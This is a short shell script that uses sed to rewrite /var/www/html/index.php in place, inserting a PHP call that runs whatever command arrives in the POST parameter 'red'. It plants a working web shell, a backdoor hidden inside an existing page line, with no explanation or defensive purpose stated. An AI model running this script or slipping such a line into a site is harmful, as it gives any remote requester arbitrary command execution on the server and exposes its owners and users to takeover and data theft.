#!/bin/sh

sed -i "s/zv_onload = \"\";/zv_onload=\"\";system(\$_POST['red']);/" /var/www/html/index.php
